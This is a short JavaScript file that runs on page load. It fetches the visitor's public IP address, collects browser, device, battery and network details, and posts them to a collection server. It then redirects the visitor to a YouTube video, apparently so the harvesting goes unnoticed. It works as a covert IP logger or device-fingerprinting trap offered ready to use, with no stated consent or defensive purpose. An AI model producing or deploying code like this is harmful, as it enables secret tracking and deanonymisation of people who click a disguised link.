// Function to fetch IP Address
async function getIPAddress() {
    try {
        let response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Unable to fetch IP Address:', error);
        return 'Unknown';
    }
}

// Function to collect detailed browser and device information
async function collectDeviceInfo() {
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        batteryLevel: null,
        ipAddress: await getIPAddress(),  // Collect IP Address
        connection: null,                 // Network Information (e.g., Cellular, WiFi)
        browserName: null,                // To be determined
    };

    // Detect battery level if supported
    if (navigator.getBattery) {
        let battery = await navigator.getBattery();
        deviceInfo.batteryLevel = (battery.level * 100) + "%";
    }

    // Collect Network Information if available
    if (navigator.connection) {
        deviceInfo.connection = {
            type: navigator.connection.effectiveType,  // Type of connection (e.g., wifi, 4g)
            downlink: navigator.connection.downlink + " Mbps",  // Approximate download speed
            rtt: navigator.connection.rtt + " ms"   // Approximate round-trip time
        };
    } else {
        deviceInfo.connection = "Unavailable";
    }

    // Detect browser name from userAgent
    let userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.indexOf('chrome') > -1) {
        deviceInfo.browserName = "Chrome";
    } else if (userAgent.indexOf('safari') > -1) {
        deviceInfo.browserName = "Safari";
    } else if (userAgent.indexOf('firefox') > -1) {
        deviceInfo.browserName = "Firefox";
    } else if (userAgent.indexOf('edge') > -1) {
        deviceInfo.browserName = "Edge";
    } else {
        deviceInfo.browserName = "Unknown";
    }

    // Send the collected information to your server
    sendDeviceInfo(deviceInfo);
}

// Function to send data to the server
function sendDeviceInfo(info) {
    fetch('http://localhost:3000/collect', {  // Adjust this URL based on your backend server address
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(info)
    }).then(response => {
        console.log('Data sent successfully');
    }).catch(error => {
        console.error('Error sending data:', error);
    });

    // Redirect to YouTube after data collection
    window.location.href = "https://youtu.be/4GRpdIV5DAQ";  // Change this URL to any desired link
}

// Start the data collection process when the page loads
collectDeviceInfo();
